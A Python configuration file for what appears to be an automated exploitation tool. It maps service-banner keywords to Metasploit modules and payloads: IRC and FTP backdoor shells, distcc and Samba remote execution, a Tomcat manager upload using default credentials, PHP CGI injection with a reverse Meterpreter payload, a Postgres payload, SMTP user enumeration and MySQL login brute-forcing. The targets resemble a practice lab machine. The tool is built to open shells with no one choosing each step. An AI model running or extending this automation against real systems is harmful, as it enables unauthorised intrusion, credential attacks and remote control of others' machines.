# here we store a list of vulnerabilities our software will be able to exploit
# description of the exploit's keywords must be comma separated
# module name is the module name used in metasploit
from colorama import Fore

class Vulnerability():
    def __init__(self, classDict):
        # If any of these terms match, the exploit is run
        self.keywords = classDict["keywords"].split(",")
        # if at least minOptionalKeyTermsThatMustMatch of these terms match, the exploit is run
        self.optionalKeywords = classDict["optionalKeywords"].split(",")
        self.minOptionalKeyTermsThatMustMatch = classDict["minOptionalKeyTermsThatMustMatch"]
        self.caseSensitiveKeyTermMatch = classDict["caseSensitiveKeyTermMatch"]
        self.module = classDict["moduleName"]
        self.description = classDict["description"]
        self.exploitType = classDict["exploitType"]
        # This is the amount of time the exploit should take to run.  Mutliple exploits should 
        # not run at the same time, one should finish before the next is run hence this timer
        self.maxRuntime = classDict["maxRuntime"]
        # THESE ARE MAYBE's FOR EACH EXPLOIT, SOME DONT USE PAYLOADS, MAX RUN TIME...etc
        if "payload" in classDict: self.payload = classDict["payload"]
        else: self.payload = None
        if "canCheck" in classDict: self.canCheck = classDict["canCheck"]
        else: self.canCheck = True
        if "outputPatternMatch" in classDict: self.outputPatternMatch = classDict["outputPatternMatch"]
        else: self.outputPatternMatch = None
        # will this exploit get us a list of usernames to use
        if "addUserNames" in classDict: self.addUserNames = classDict["addUserNames"]
        else: self.addUserNames = False
        if "color" in classDict: self.color = classDict["color"]
        else: self.color = Fore.WHITE

        # run options for the module
        if "options" in classDict:
            options = classDict["options"]
            self.options = dict()
            for (key,value) in options:
                self.options[key] = value
        else:
            self.options = None

        self.session = None # TODO: create a method to set and get this

# leave this here
# FF1493

# TO ADD A NEW VULNERABILITY
# 1) add its keywords, min number of key terms to be matched, moduleName, a short description here, and a payload if the exploit has one
# DO NOT ADD ANY EXTRA SPACES.  
# GOOD: "Apache Tomcat,rce,Port 444"
# BAD: "Apache Tomcat, rce, Port 444"
# 2) ADD THE VARIABLE YOU MAKE TO THE LIST BELOW
# 3) TODO: configure this shit to work CORRECTLY with payloads

_ircdDict = {
    "keywords": "UnrealIRCd",
    "optionalKeywords": "irc,6667",
    "minOptionalKeyTermsThatMustMatch": 2,
    "caseSensitiveKeyTermMatch": True,
    "moduleName": "unix/irc/unreal_ircd_3281_backdoor",
    "description": "unreal ircd backdoor RCE",
    "exploitType": "exploit",
    "payload": "cmd/unix/bind_ruby",
    "outputPatternMatch": "shell session [0-9]* opened.*",
    "maxRuntime": 20,
    "color": Fore.BLACK
    } 
_ircd = Vulnerability(_ircdDict)

_distccDict = {
    "keywords": "distcc",
    "optionalKeywords": "3632",
    "minOptionalKeyTermsThatMustMatch": 2,
    "caseSensitiveKeyTermMatch": False,
    "moduleName": "unix/misc/distcc_exec",
    "description": "distcc RCE",
    "exploitType": "exploit",
    "payload": "cmd/unix/bind_ruby",
    "outputPatternMatch": "shell session [0-9]* opened.*",
    "maxRuntime": 20,
    "color": Fore.BLUE
    } 
_distcc = Vulnerability(_distccDict)

_vsftpdDict = {
    "keywords": "vsftpd",
    "optionalKeywords": "21,ftp",
    "minOptionalKeyTermsThatMustMatch": 2,
    "caseSensitiveKeyTermMatch": False,
    "moduleName": "unix/ftp/vsftpd_234_backdoor",
    "description": "vsftpd backdoor RCE",
    "exploitType": "exploit",
    "payload": "cmd/unix/interact",
    "outputPatternMatch": "shell session [0-9]* opened.*",
    "maxRuntime": 20,
    "color": Fore.CYAN
    } 
_vsftpd = Vulnerability(_vsftpdDict)

# doesnt work yet idk why
_smtpScannerDict = {
    "keywords": "smtp",
    "optionalKeywords": "25",
    "minOptionalKeyTermsThatMustMatch": 2,
    "caseSensitiveKeyTermMatch": False,
    "moduleName": "scanner/smtp/smtp_enum",
    "description": "SMTP scanner for user enumeration",
    "exploitType": "auxiliary",
    "payload": None,
    "outputPatternMatch": "Users found:.*",
    "canCheck": False,
    "maxRuntime": 1500,
    "color": Fore.GREEN
    } 
_smtpScanner= Vulnerability(_smtpScannerDict)

_mysqlBruteForceDict = {
    "keywords": "",
    "optionalKeywords": "3306,mysql,Support41Auth",
    "minOptionalKeyTermsThatMustMatch": 2,
    "caseSensitiveKeyTermMatch": True,
    "moduleName": "scanner/mysql/mysql_login",
    "description": "SQL login spam",
    "exploitType": "auxiliary",
    "payload": None,
    "outputPatternMatch": "MYSQL - Success: .*", # TODO: check this
    "addUserNames": True,
    "maxRuntime": 10000,
    "color": Fore.MAGENTA,
    # "options": [("ANONYMOUS_LOGIN", True),
    #             ("BLANK_PASSWORDS", True)]
                # ,
                # ("DB_ALL_USERS", True),
                # ("USER_AS_PASS", True),
                # ("VERBOSE", True),
                # ("USER_FILE", "USERNAMES.txt"),
                # ("PASS_FILE", "PASSWORDS.txt")]
    }
_mysqlBruteForce = Vulnerability(_mysqlBruteForceDict)

_tomcatDict = {
    "keywords": "Apache Tomcat/Coyote JSP engine 1.1",
    "optionalKeywords": "8180,http,Apache Tomcat/Coyote JSP engine 1.1",
    "minOptionalKeyTermsThatMustMatch": 2,
    "caseSensitiveKeyTermMatch": True,
    "moduleName": "multi/http/tomcat_mgr_upload",
    "description": "Port 8180 Apache Tomcat Exploit",
    "exploitType": "exploit",
    "payload": None,
    "outputPatternMatch": "Meterpreter session [0-9]* opened.*",  # TODO: check this
    "addUserNames": True,
    "maxRuntime": 10000,
    "color": Fore.RED,
    "options": [("HttpPassword", "tomcat"),
                ("HttpUsername", "tomcat"),
                ("RPORT", "8180")]
    }
_tomcatDict = Vulnerability(_tomcatDict)

_sambaDict = {
    "keywords": "netbios-ssn",
    "optionalKeywords": "139,445,netbios-ssn,Samba smbd 3.X - 4.X (workgroup: WORKGROUP)",
    "minOptionalKeyTermsThatMustMatch": 2,
    "caseSensitiveKeyTermMatch": True,
    "moduleName": "multi/samba/usermap_script",
    "description": "Port 8180 Apache Tomcat Exploit",
    "exploitType": "exploit",
    "payload": None,
    "outputPatternMatch": "shell session [0-9]* opened.*",  # TODO: check this
    "addUserNames": True,
    "maxRuntime": 20,
    "color": Fore.YELLOW
    }
_sambaDict = Vulnerability(_sambaDict)

_apacheDict = {
    "keywords": "Apache httpd 2.2.8 ((Ubuntu) DAV/2)",
    "optionalKeywords": "80,http,Apache httpd 2.2.8 ((Ubuntu) DAV/2)",
    "minOptionalKeyTermsThatMustMatch": 2,
    "caseSensitiveKeyTermMatch": True,
    "moduleName": "multi/http/php_cgi_arg_injection",
    "description": "Apache (CGI Argument Injection)",
    "exploitType": "exploit",
    "payload": None,
    "outputPatternMatch": "Meterpreter session [0-9]* opened.*",
    "addUserNames": True,
    "maxRuntime": 10000,
    "options": [("PAYLOAD", "php/meterpreter/reverse_tcp")],
    "color": Fore.LIGHTRED_EX
    }
_apacheDict = Vulnerability(_apacheDict)

_postgresDict = {
    "keywords": "postgresql",
    "optionalKeywords": "5432,postgresql,PostgreSQL DB 8.3.0 - 8.3.7",
    "minOptionalKeyTermsThatMustMatch": 2,
    "caseSensitiveKeyTermMatch": True,
    "moduleName": "linux/postgres/postgres_payload",
    "description": "Exploiting Port 5432 (Postgres)",
    "exploitType": "exploit",
    "payload": None,
    "outputPatternMatch": "Meterpreter session [0-9]* opened.*",
    "addUserNames": True,
    "maxRuntime": 20,
    "color": Fore.LIGHTGREEN_EX
    }
_postgresDict = Vulnerability(_postgresDict)

vulnerabilities = [_ircd, _distcc, _vsftpd, _smtpScanner, _tomcatDict, _sambaDict, _apacheDict, _postgresDict]